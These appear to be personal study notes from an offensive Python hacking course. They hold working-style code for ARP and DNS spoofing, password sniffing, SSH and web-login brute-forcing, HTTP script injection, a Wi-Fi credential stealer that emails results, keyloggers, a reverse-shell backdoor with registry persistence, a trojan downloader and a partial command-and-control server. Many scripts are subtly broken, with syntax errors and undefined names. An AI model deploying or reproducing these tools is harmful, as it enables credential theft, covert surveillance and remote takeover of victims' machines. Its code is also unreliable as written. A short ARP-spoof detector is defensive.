
## Contents :-

#### [[#01 - MAC Changer]]
#### [[#02 - Network Scanner]]
#### [[#03 - ARP Spoofing]]
#### [[#04 - Packet Sniffer]]
#### [[#05 - DNS Spoofer]]
#### [[#06 - Password Sniffer]]
#### [[#07 - Cracking Password Hashes]]
#### [[#08 - Threaded SSH Brute-forcer]]
#### [[#09 - File Interceptor]]
#### [[#10 - Code Injector]]
#### [[#11 - Bypassing HTTPS]]
#### [[#12 - Port Scanner]]
#### [[#13 - Writing Malware]]
#### [[#14 - Website Crawler]]
#### [[#15 - Backdoor]]
#### [[#16 - Vulnerability Scanner]]
#### [[#17 - Email Scraper]]

---

## 01 - MAC Changer

- **MAC** (***Media Access Control***) - permanent, physical, and unique address assigned to ethernet/NIC cards by manufacturer
- Changing MAC address can:
	- increase anonymity
	- impersonate other devices 
	- bypass filters 
- Commands to change MAC address:
```
ifconfig eth0 down
ifconfig eth0 hw ether 00:11:22:33:44:55
ifconfig eth0 up
```

### Code

```
#!/usr/bin/env python

# mac_changer.py

import subprocess
import optparse
import re


def get_arguments():
	parser = optparse.OptionParser()
	parser.add_option("-i", "--interface", dest="interface", help="Interface for which MAC address needs to be changed")
	parser.add_option("-m", "--mac", dest="new_mac", help="New MAC Address")
	[options, argument] = parser.parse_args()
	
	if not options.interface:
		parser.error("!! Please specify an interface. Use --help for more info.")
	elif not options.new_mac:
		parser.error("!! Please specify the MAC address. Use --help for more info.")
	return options

def change_mac():
	print("[+] Changing MAC Address for " + interface + " to " + new_mac)
	subprocess.call(["ifconfig", interface, "down"])
	subprocess.call(["ifconfig", interface, "hw", "ether", new_mac])
	subprocess.call(["ifconfig", interface, "up"])

def get_current_mac(interface):
	ifconfig_result = subprocess.check_output(["ifconfig", interface])
	mac_search_result = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig_result))
	
	if mac_search_result:
		return mac_search_result.group[0]
	else:
		print("[-] MAC Address not found.")

options = get_arguments()
current_mac = get_current_mac(options.interface)
print("Current MAC: " + str(current_mac))

change_mac(options.interface, options.new_mac)

current_mac = get_current_mac(options.interface)
if current_mac == options.new_mac:
	print("[+] MAC address successfully changed to " + str(current_mac))
else:
	print("[-] MAC address modification failed.")
```

---

## 02 - Network Scanner

- discover all devices on the network 
- display their IP address 
- display their MAC address
- `route -n`: displays IP routing table

### Steps:

1. Create ARP request directed to broadcast MAC asking for IP
	- Use ARP to ask who has IP 
	- Set Destination MAC to Broadcast MAC 
2. Send packet and receive response 
3. Parse response and display result

### Code

```
#!/usr/bin/env python

# network_scanner.py

import scapy.all as scapy
import argparse

def get_arguments():
	parser = optparse.ArgumentParser()
	parser.add_option("-t", "--target", dest="target", help="Target IP / IP range")
	options = parser.parse_args()
	return options

def scan(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request
	answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
	
	clients_list = []
	for element in answered_list:
		client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
		clients_list.append(client_dict)
	return clients_list
	
def print_result(results_list):
	print("IP\t\t\tMAC Address\n---------------------------------")
	for client in results_list:
		print(client["ip"] + "\t\t" + client["mac"])

options = get_arguments()
scan_result = scan(options.target)
print)result(scan_result)
```

---

## 03 - ARP Spoofing

- Victim and router exchange information with attacker while assuming they are exchanging information between each other
- ARP spoofing is possible because:
	- clients accept responses even if they did not send a request 
	- clients trust responses without any form of verification
- Using arpspoof tool: `arpspoof -i [interface] -t [target-IP] [gateway]`
- `echo 1 > /proc/sys/net/ipv4/ip_forward`: port forwarding

### Code

```
#!/usr/bin/env python

# arp_spoofer_1.py

import scapy.all as scapy
import sys, time

def get_mac_address(ip_address):
	broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
	arp_layer = scapy.ARP(pdst=ip_address)
	request_packet = broadcast_layer/arp_layer
	response_packet = scapy.srp(request_packet, timeout=2, verbose=False)[0]
	return response_packet[0][1].hwsrc

def arp_spoof(router_ip, target_ip, router_mac, target_mac):
	packet1 = scapy.ARP(op=2, hwdst=router_mac, pdst=router_ip, psrc=target_ip)
	packet2 = scapy.ARP(op=2, hwdst=target_mac, pdst=target_ip, psrc=router_ip)
	scapy.send(packet1)
	scapy.send(packet2)

target_ip = str(sys.argv[2])
router_ip = str(sys.argv[1])

target_mac = str(get_mac_address(target_ip))
print('Target MAC Address: ' + target_mac + '\n')
router_mac = str(get_mac_address(router_ip))
print('Router MAC Address: ' + router_mac + '\n')

try:
	while True:
		arp_spoof(router_ip, target_ip, router_mac, target_mac)
		time.sleep(2)
except KeyboardInterrupt:
	print('Stopping ARP spoofer...')
	exit(0)
```

```
#!/usr/bin/env python

# arp_spoofer_2.py

import scapy.all as scapy
import time
import sys

def get_mac_address(ip_address):
	broadcast_layer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
	arp_layer = scapy.ARP(pdst=ip_address)
	request_packet = broadcast_layer/arp_layer
	response_packet = scapy.srp(request_packet, timeout=2, verbose=False)[0]
	return response_packet[0][1].hwsrc
	
def spoof(target_ip, spoof_ip):
	target_mac = get_mac(target_ip)
	packet = scapy.ARP(op=2, pdst=targets_ip, hwdst=target_mac, psrc=spoof_ip)
	scapy.send(packet, verbose=False)
	
def restore(destination_ip, source_ip):
	destination_mac = get_mac(destination_ip)
	source_mac = get_mac(source_ip)
	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
	scapy.send(packet, count=4)
	
target_ip = "10.0.2.7"
gateway_ip = "10.0.2.1"

try:
	packets_sent_count = 0
	while True:
		spoof(target_ip, gateway_ip)
		spoof(gateway_ip, targets_ip)
		packets_sent_count = packets_sent_count + 2
		print("\r[+] Sent " + str(packets_sent_count))
		sys.stdout.flush()
		time.sleep(2)
except KeyboardInterrupt:
	print("\n[-] Quitting.\n")
	restore(target_ip, gateway_ip)
	restore(gateway_ip, target_ip)
```

### 03.1 - ARP Spoof Detector

- Watch value for gateway MAC in ARP table- but this method won't work if tool is executed after attack.
- So analyze 'is-at' ARP responses.

#### Steps

1. Check if IP is gateway IP.
2. Check if source MAC is actually gateway MAC.

#### Code

```
#!/usr/bin/env python

# arpspoof_detector.py

import scapy.all as scapy

def get_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request 
	answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
	return answered_list[0][1].hwsrc

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
	
def process_sniffed_packet(packet):
	if packet.haslayer(scapy.ARP) and packet[scapy.ARP].op == 2:
		
		try:
			real_mac = get_mac(packet[scapy.ARP].psrc)
			response_mac = packet[scapy.ARP].hwsrc
			print(packet.show())
		
			if real_mac != response_mac:
				print("You are under ARP Spoof Attack!")
				
		except:
			pass

sniff(eth0)
```

---

## 04 - Packet Sniffer

- capture data flowing through an interface
- filter this data 
- display useful information 

### Code

```
#!/usr/bin/env python

# packet_sniffer.py

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url():
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
	if packet.haslayer(scapy.Raw):
		load = str(packet[scapy.Raw].load)
		keywords = ["username", "user", "login", "password", "pass"]
		for keyword in keywords:
			if keyword in load:
				return load
				
def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url = get_url(packet)
		print("[+] HTTP Request >> " + url.decode())
		
		login_info = get_login_info(packet)
		if login_info:
			print("\n\n[+] Possible username/password > " + login_info + "\n\n")
			
sniff("eth0")
```

---

## 05 - DNS Spoofer 

- once packets are captured, they can also be modified
- **DNS** (***Domain Name Server***) translates domain names into IP addresses of servers that are hosting those websites.

### Steps

1. Trap the captured packets in a queue
2. Filter for DNS Response in the packet payload
3. In the DNS Response, check if website name is present, and replace the website IP with malicious IP 
4. Send modified DNS Response payload   

### Prerequisites

- `pip install netfilterqueue`
- `ipatbles -I FORWARD -j NFQUEUE --queue-num 0`	       // for remote computers
- `ipatbles -I INPUT -j NFQUEUE --queue-num 0`		// for same machine
- `ipatbles -I OUTPUT -j NFQUEUE --queue-num 0`		// for same machine
- To remove *iptables* rules: `iptables --flush`

### Code

```
import netfilterqueue
import scapy.all as scapy 

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(DNSRR):
		qname = scapy_packet[scapy.DNSRR].qname
		if "www.bing.com" in qname:
			print("\n[+] Spoofing target\n")
			answer = scapy.DNSRR(rrname=qname, rdata=MALICIOUS_IP)
			scapy_packet[scapy.DNS].an = answer 
			scapy_packet[scapy.DNS].account = 1

			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum
			
			packet.set_payload(str(scapy_packet))
			
	packet.accept()
	
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
```

---

## 06 - Password Sniffer 

### Code 

```
from scapy.all import *
from urllib import parse
import re 

iface = "eth0"

def extract_login_pass(body):
	username = None
	password = None
	
	userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name', 'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname', 'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename', 'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username', 'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']
	
    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword', 'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword', 'login_password', 'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']
				  
	for login in userfields:
		login_re = re.search('(%s=[^&]+)' % login, body, re.IGNORECASE)
		if login_re:
			username = login_re.group()
			
	for passfield in passfields:
		pass_re = re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
		if pass_re:
			password = pass_re.group()
			
	if username and password:
		return (username, password)

def pkt_parser(packet):
	if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP):
		body = str(packet[TCP].payload)
		login_info = extract_login_pass(body)
		if login_info != None:
			print(packet[TCP].payload)
			print(parse.unquote(login_info[0])
			print(parse.unquote(login_info[1])
	else:
		pass
		
try:
	sniff(iface=iface, prn=pkt_parser, store=0)
except KeyboardInterrupt:
	print('Stopping ...')
	exit(0)
```

---

## 07 - Cracking Password Hashes

### Code

```
#!/usr/bin/env python

# password_hash_cracker.py

import hashlib

hash_type = str(input("Enter type of hash to be bruteforced: "))
file_path = str(input("Enter path to password wordlist: "))
decrypt_hash = str(input("Enter hash value to bruteforce: ")) 

with open(file_path, "r") as file:
	for line in file.readlines():
		if hash_type == "md5":
			hash_object = hashlib.md5(line.strip().encode())
			hashed_word = hash_object.hexdigest()
			if hashed_word == decrypt_hash:
				print("[+] Found MD5 Password --> " + line.strip())
				exit(0)
				
		if hash_type == "sha1":
			hash_object = hashlib.sha1(line.strip().encode())
			hashed_word = hash_object.hexdigest()
			if hashed_word == decrypt_hash:
				print("[+] Found MD5 Password --> " + line.strip())
				exit(0)
	
	print("[-] Password not found in wordlist")
```

```
#!/usr/bin/env python

# wireless_bruteforcer.py

from wireless import Wireless

wire = Wireless()
with open("passwords.list" as "r") as file:
	for line in file.readlines():
		if wire.connect(ssid='takmicar', password=line.strip()) == True:
			print("[+] " + line.strip() + " Success!")
		else:
			print("[+] " + line.strip() + " Failed.")
```

---

## 08 - Threaded SSH Brute-forcer

- try to connect to a SSH account by brute-forcing passwords

### Code 

```
#!/usr/bin/env python

# threaded_ssh_bruteforcer

import paramiko, sys, os, termcolor
import threading, time 

stop_flag = 0

def ssh_connect(password, code=0):
	global stop_flag
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(host, port=22, username=username, password=password)
		stop_flag = 1
		print(termcolor.colored(('[+] Found Password: ' + password + ', for Username: ' + username), 'green')
	except:
		print(termcolor.colored(('[-] Incorrect Password: ' + password), 'red')
	ssh.close()

host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Password File: ')
print('\n')

if os.path.exists(input_file) == False:
	print('File/Path doesn't exist')
	sys.exit(1)
	
with open(input_file, 'r') as file:
	for line in file.readlines():
		if stop_flag == 1:
			t.join()
			exit()
		password = line.strip()
		t = threading.Thread(target=ssh_connect, args=(password,))
		t.start()
		time.sleep(0.5)
```

---

## 09 - File Interceptor

- modifying HTTP requests

### Code 

```
#!/usr/bin/env python

# file_interceptor.py

import netfilterqueue
import scapy.all as scapy 

ack_list = []

def set_load(original_packet, load):
	original_packet[scapy.Raw].load = load
	del original_packet[scapy.IP].len
	del original_packet[scapy.IP].chksum
	del original_packet[scapy.TCP].chksum
	return original_packet

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		if scapy_packet[scapy.TCP].dport == 80:
			if ".exe" in scapy_packet[scapy.Raw].load:
				ack_list.append(scapy_packet[scapy.TCP].ack)
		elif scapy_packet[scapy.TCP].sport == 80:
			if scapy_packet[scapy.TCP].seq in ack_list:
				ack_list.remove(scapy_packet[scapy.TCP].seq)
				print("[+] Replacing file")
				modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe")
				packet.set_payload(str(modified_packet))
	packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
```

---

## 10 - Code Injector

- HTML response is encoded in gzip
- Remove the *Accept Encoding* header in the request to get response in plain HTML
- The header can be replaced using Regex 
- Injected code may not work in all websites due to the *Content Length* header. Website does not load the entire HTML code due to change in the content length by the injected code. 

### Code 

```
#!/usr/bin/env python

# code_injector.py

import netfilterqueue
import scapy.all as scapy 
import re

def set_load(original_packet, load):
	original_packet[scapy.Raw].load = load
	del original_packet[scapy.IP].len
	del original_packet[scapy.IP].chksum
	del original_packet[scapy.TCP].chksum
	return original_packet

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		load = scapy_packet[scapy.Raw].load
		
		if scapy_packet[scapy.TCP].dport == 80:
			print("\n[+] Request sent ...\n")
			load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
			
		elif scapy_packet[scapy.TCP].sport == 80:
			print("\n[+] Response received ...\n")
			print(scapy_packet.show())
			injection_code = "<script>alert('Code Injection Successful')</script>"
			load = load.replace("</body>", injection_code + "</body>")
			content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
			if content_length_search:
				content_length = int(content_length_search.group(1)
				new_content_length = content_length + len(injection_code)
				load = load.replace(content_length, str(new_content_length))
			
		if load != scapy_packet[scapy.Raw].load:
			modified_packet = set_load(scapy_packet, load)
			set_payload(str(modified_packet))
			
	packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
```

### 10.1 - BeEF

- The Browser Exploitation Framework Project
- It allows us to launch many attacks on a hooked target. 
- Targets are hooked once they load a hook URL.
- `apt-get install beef-xss`

---

## 11 - Bypassing HTTPS

- HTTP sends data in plain text
- HTTPS encrypts HTTP using TLS/SSL

### Steps

1. Run ARP Spoof 
2. SSL Strip command: `bettercap -iface eth0 -caplet hstshijack/hstshijack`

---

## 12 - Port Scanner

- scans for open ports on target machine
### Code 

```
#!/usr/bin/env python

# portscanner.py

import socket
from IPy import IP 

def check_ip(ip):
	try:
		IP(ip)
		return(ip)
	except ValueError:
		return socket.gethostbyname(ip)
		
def get_banner(sock):
	return sock.recv(1024)

def scan_port(ipaddress, port):
	try:
		sock = socket.socket()
		sock.settimeout(1)
		sock.connect((ipaddress, port))
		try:
			banner = get_banner(sock)
			print('[+] Port ' + str(port) + ' is OPEN ' + ': ' + str(banner.decode().strip('\n'))
		except:
			print('[+] Port ' + str(port) + ' is OPEN')
	except:
		pass
	
def scan(target):
	validated_ip = check_ip(target)
	print('\n' + '[-> Scanning Target...] ' + str(target))
	for port in range(1,500):
		scan_port(validated_ip, port)
	
	
if __name__ == "__main__":
	targets = input('[+] Enter Scan Targets (separated by ,): ')
	if ',' in targets:
		for ip in targets.split(','):
			scan(ip.strip(' '))
	else:
		scan(targets)
```

#### Using OOP

```
#!/usr/bin/env python

# portscanner.py - using OOP

import socket
from IPy import IP 

class PortScan():
	banners = [] 
	open_ports = []
	
	def __init__(self, target, port_num):
		self.target = target
		self.port_num = port_num
		
	def check_ip(self):
		try:
			IP(self.target)
			return(self.target)
		except ValueError:
			return socket.gethostbyname(self.target)
		
	def scan_port(self, port):
		try:
			validated_ip = self.check_ip()
			sock = socket.socket()
			sock.settimeout(1)
			sock.connect((validated_ip, port))
			self.open_ports.append(port)
			try:
				banner = sock.recv(1024).decode().strip('\n').strip('\r')
				self.banners.append(banner)
			except:
				self.banners.append(' ')
			sock.close()
		except:
			pass
	
	def scan(self):
		for port in range(1,500):
			self.scan_port(port)
```

---

## 13 - Writing Malware

### 13.1 Execute Command

- Execute any system command on any OS.

#### Code 

```
#!/usr/bin/env python

# execute_report.py

import subprocess, smtplib, re

def send_mail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()

# command = "msg * hacked"
# subprocess.Popen(command, shell=True)

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in network_names_list:
	command = "netsh wlan show profiles " + network_name + " key=clear"
	current_result = subprocess.check_output(command, shell=True)
	result += current_result 

send_mail("abc@gmail.com", "abcabc", result)
```

```
#!/usr/bin/env python

# download_file.py

import requests 

def download(url):
	response = requests.get(url)
	print(response)
	print(response.content)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(response.content)
	
download("https://i0.wp.com/myautoworld.com/wp-content/uploads/2016/11/2017_Nissan_Sentra_NISMO_27.jpg")
```

```
#!/usr/bin/env python

# download_execute_report.py

import requests, smtplib, subprocess, os, tempfile

def download(url):
	response = requests.get(url)
	print(response)
	print(response.content)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(response.content)
		
def send_mail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()		

temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
download("lazagne.exe")
command = "laZagne.exe all"
result = subprocess.check_output(command, shell=True)
send_mail("abc@gmail.com", "abcabc", result)
os.remove("laZagne.exe")
```

### 13.2 Keylogger

- Keylogger is a program that records keys pressed on the keyboard.
- It can store logs locally or send them to a remote server.
- `pip install pynput`
- `killall python`: to stop the program
- `type file.txt`: read file in Windows CMD

#### Code

```
#!/usr/bin/env python

# keylogger_1.py

import pynput.keyboard as pk
import threading
import smtplib

class Keylogger:
	def __init__(self, time_interval, email, password):
		self.log = "*** KEYLOGGER STARTED ***"
		self.interval = time_interval
		self.email = email
		self.password = password
		
	def update_log(self, string):
		self.log += string
	
	def process_key_press(self, key):
		try:
			current_key = str(key.char)
		except:
			if key == key.space:
				current_key = " "
			else:
				current_key = " " + str(key) + " ") 
		update_log(current_key)

	def send_mail(email, password, message):
		server = smtplib.SMTP("smtp.gmail.com", 587)
		server.starttls()
		server.login(email, password)
		server.sendmail(email, email, message)
		server.quit()

	def report(self):
		print(self.log)
		self.send_mail(self.email, self.password, "\n\n" + self.log)
		self.log = ""
		timer = threading.Timer(self.interval, self.report)
		timer.start()

	def start_listener(self):
		keyboard_listener = pk.Listener(on_press=self.process_key_press)
		with keyboard_listener:
			self.report()
			keyboard_listener.join()
			
keylogger_obj = Keylogger(120, "abc@gmail.com", "abcabc")
keylogger_obj.start() 
```

```
#!/usr/bin/env python

# keylogger_2.py

import os
from pynput.keyboard import Listener
import time
import threading


class Keylogger():
    keys = []
    count = 0
    flag = 0
    path = os.environ['appdata'] +'\\processmanager.txt'
    #path = 'processmanager.txt'

    def on_press(self, key):
        self.keys.append(key)
        self.count += 1

        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    def read_logs(self):
        with open(self.path, 'rt') as f:
            return f.read()

    def write_file(self, keys):
        with open(self.path, 'a') as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find('backspace') > 0:
                    f.write(' Backspace ')
                elif k.find('enter') > 0:
                    f.write('\n')
                elif k.find('shift') > 0:
                    f.write(' Shift ')
                elif k.find('space') > 0:
                    f.write(' ')
                elif k.find('caps_lock') > 0:
                    f.write(' caps_lock ')
                elif k.find('Key'):
                    f.write(k)

    def self_destruct(self):
        self.flag = 1
        listener.stop()
        os.remove(self.path)

    def start(self):
        global listener
        with Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == '__main__':
    keylog = Keylogger()
    t = threading.Thread(target=keylog.start)
    t.start()
    while keylog.flag != 1:
        time.sleep(10)
        logs = keylog.read_logs()
        print(logs)
        #keylog.self_destruct()
    t.join()
```

---

## 14 - Website Crawler

- Websites can be crawled for subdomains and directories.
- Subdomain is the domain written before the actual domain name. They are a part of the main domain.
- Directories are mentioned after the `/`.

### Code

```
#!/usr/bin/env python

# website_crawler.py

import requests
inport re
import urllib.parse as urlparse

target_links = []

def request(target_url):
	try:
		return requests.get(target_url)
	except requests.exceptions.ConnectionError:
		pass
		
def find_subdomains_from_wordlist(target_url):
	with open("subdomains.list", "r") as wordlist:
	
		for line in wordlist:
			test_url = line.strip() + "." + target_url
			response = request(test_url)
			
			if response:
				print("[+] Discovered subdomain --> " + test_url)	
	
def extract_links(url):
	response = request(url)
	
	if response:
		return re.findall('(?:href=")(.*?)"', response.content().decode(errors="ignore"))
	
def crawl(url):
		href_links = extract_links(url)
		
		for link in href_links:
			link = urlparse.urljoin(target_url, link)
			
			if "#" in link:
				link = link.split('#')[0]
			
			if target_url in link and link not in target_links:
				target_links.append(link)
				print(link)
				crawl(link)
		
target_url = "google.com"

find_subdomains_from_wordlist(target_url)
crawl(target_url)			

```

```
#!/usr/bin/env python

# login_bruteforcer.py

import requests

target_url = "http://10.0.2.20/dvwa/login.php"
data_dict = {"username":"admin", "password":"", "Login":"submit"}

with open("passwords.list", "r") as wordlist:
	for line in wordlist:
		word = line.strip()
		data_dict["password"] = word
		response = requests.post(target_url, data=data_dict)
		if "Login failed" not in response.content():
			print("[+] Password found --> " + word)
			exit()
		
print("\n...End of program...\n")

```

---
### 15 - Backdoor

- a program that gives full control of a system when executed on that system 
- **Bind/Direct connection** - victim machine listens for requests on a specific port
- **Reverse connection** - backdoor program sends request to attacker machine which is listening on a specific port 
- `nc -vv -l -p 4444`: create a netcat listener on port 4444
- `more file.txt`: read a file in windows
- **Serialization** - client converts object to a stream of well-defined bytes and sends it to the server, which converts the stream of bytes back into the object.

#### Code

```
#!/usr/bin/env python

# reverse_backdoor.py

import sys
import socket
import subprocess
import json
import os
import base64
import shutil

class Backdoor:
	def __init__(self, ip, port):
		self.persistence()
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))
		
	def persistence(self):
		file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
		if not os.path.exists(file_location):
			shutil.copyfile(sys.executable, file_location)
			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + file_location + '"', shell=True)
		
	def send_json(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data.encode())
		
	def receive_json(self):
		while True:
			json_data = b""
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue

	def execute_system_command(self, command):
		DEVNULL = open(os.devnull, 'wb')
		return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
		
	def change_working_directory(self, path):
		os.chdir(path)
		return "Working Directory changed to " + path
		
	def read_file(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())
			
	def write_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.b4decode(content))
			return "[+] Upload Successful!"
		
	def run(self):
		connection.send("\n[+] Connection Established !!\n")

		while True:
			received_command = self.receive_json()
			
			try:
				if received_command[0] == "exit":
					self.connection.close()
					exit()
				elif received_command[0] == "cd" and len(received_command) > 1:
					command_result = self.change_working_directory(received_command[1])
				elif received_command[0] == "download":
					command_result = self.read_file(received_command[1]).decode()
				elif received_command[0] == "upload":
					command_result = self.write_file(command[1], command[2])
				else:
					command_result = self.execute_system_command(received_command).decode()
					
			except Exception:
				command_result = "[-] Error occured during command execution."
				
			self.send_json(command_result)

		connection.close()

target_ip = "10.0.2.16"
port_no = 4444

try:
	backdoor_obj = Backdoor(target_ip, port_no)
	backdoor_obj.run()
except Exception:
	sys.exit()
```

```
#!/usr/bin/env python

# listener.py

import socket, json, base64

class Listener:
	def __init__(self, ip, port):
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
		listener.bind((ip, port))
		listener.listen(0)
		print("\n[+] Waiting for incoming connections ...")
		self.connection, address = listener.accept()
		print("\n[+] Connection established with " + str(address))
		
	def send_json(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data.encode())
		
	def receive_json(self):
			while True:
			json_data = b""
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue
		
	def remote_execute(self, command):
		self.send_json(command)
		if command[0] == "exit":
			self.connection.close()
			exit()
			
		return self.receive_json()
		
	def write_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.b4decode(content))
			return "[+] Download Successful!"
			
	def read_file(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())
		
	def run(self):
		while True:
			command = input(">> ")
			command = command.split(" ")
			
			try:
				if command[0] == "upload":
					file_content = self.read_file(command[1])
					command.append(file_content)
					
				command_result = self.remote_execute(command)
				
				if command[0] == "download" and "[-] Error" not in command_result:
					self.write_file(command[1], command_result)
					
			except Exception:
				command_result = "[-] Error occured during command execution."
				
			print(command_result)
			
listener_obj = Listener("10.0.2.16", 4444)
listener_obj.run()
```

- `pyinstaller.exe reverse_backdoor.py --onefile --noconsole`: use *pyinstaller* to convert `.py` to `.exe.`
- `wine`: allows to run Windows programs inside Linux
- `Ctrl + H`: shows hidden directories in linux
- Persistence programs start when the system starts.
- Open Registry Editor -> Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run: files added here will always run on system startup
- `reg add /?`: gives help description
- `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test /t REG_SZ /d "C:/test.exe"`: add new entry that runs everytime system starts

```
#!/usr/bin/env python

# trojan.py

import os, requests, subprocess, tempfile

def download(url):


temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)

download("http://10.0.2.16/files/car.jpg")
subprocess.Popen("car.jpg", shell=True)

download("http://10.0.2.16/files/reverse_backdoor.exe")
subprocess.call("reverse_backdoor.exe", shell=True)

os.remove(car.jpg)
os.remove(reverse_backdoor.exe)
```

#### Trojan by Embedding File in Program Code 

- `wine pyinstaller.exe --add-data "root/Downloads/sample.pdf;." --onefile --noconsole reverse_backdoor.py`: package file with code
- Add the following in backdoor.py:

```
file_name = sys._MEIPASS + "\sample.pdf"
subprocess.Popen(file_name, shell=True)
```



```
#!/usr/bin/env python

# command_control.py

import socket
import termcolor
import json
import os
import threading

def reliable_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def reliable_send(target, data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def upload_file(target, file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(target, file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def target_communication(target, ip):
    count = 0
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(target, command)
        if command == 'quit':
            break
        elif command == 'background':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(target, command[7:])
        elif command[:8] == 'download':
            download_file(target, command[9:])
        elif command[:10] == 'screenshot':
            f = open('screenshot%d' % (count), 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            count += 1
        elif command == 'help':
            print(termcolor.colored('''\n
            quit                                --> Quit Session With The Target
            clear                               --> Clear The Screen
            cd *Directory Name*                 --> Changes Directory On Target System
            upload *file name*                  --> Upload File To The target Machine
            download *file name*                --> Download File From Target Machine
            keylog_start                        --> Start The Keylogger
            keylog_dump                         --> Print Keystrokes That The Target Inputted
            keylog_stop                         --> Stop And Self Destruct Keylogger File
            persistence *RegName* *fileName*    --> Create Persistence In Registry'''),'green')
        else:
            result = reliable_recv(target)
            print(result)

def accept_connections():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
